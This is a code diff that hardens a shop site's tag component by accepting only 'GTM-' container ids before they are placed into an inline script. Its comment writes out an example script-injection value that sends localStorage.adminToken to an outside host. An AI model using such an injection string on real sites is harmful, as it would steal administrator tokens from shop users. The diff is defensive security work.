@@ -26,7 +26,24 @@ async function getSeoSettings(): Promise<Record<string, string>> {
 // fbq undefined when hydration failed on a product page.
 export default async function SiteTags() {
   const s = await getSeoSettings();
-  const gtmId = s.gtmId?.trim();
+  // GTM-XXXXXXX and nothing else.
+  //
+  // This value is typed into Settings - SEO and dropped straight into an
+  // inline <script> body below, and the CSP carries 'unsafe-inline', so there
+  // is no nonce to stop whatever it contains. A value of
+  //
+  //     ');  fetch('https://elsewhere/?c='+localStorage.adminToken);  //
+  //
+  // would close the call and run as script on every page of the shop,
+  // /checkout included. The pixel ids a few lines down have been digits-only
+  // for exactly this reason; this box was the one still open.
+  //
+  // A real container id is "GTM-" and then letters and digits. Anything that
+  // is not that shape is not an id, so it is dropped rather than cleaned -
+  // a half-fixed id would quietly track nothing, and the box is the owner's
+  // own to correct.
+  const gtmRaw = (s.gtmId ?? '').trim();
+  const gtmId = /^GTM-[A-Z0-9]{4,12}$/i.test(gtmRaw) ? gtmRaw : undefined;
   // Two pixels, because one was never quite enough: the one carrying the
   // history belongs to one ad account and the one a newer ad account can see
   // started empty, and moving the site from one to the other threw away
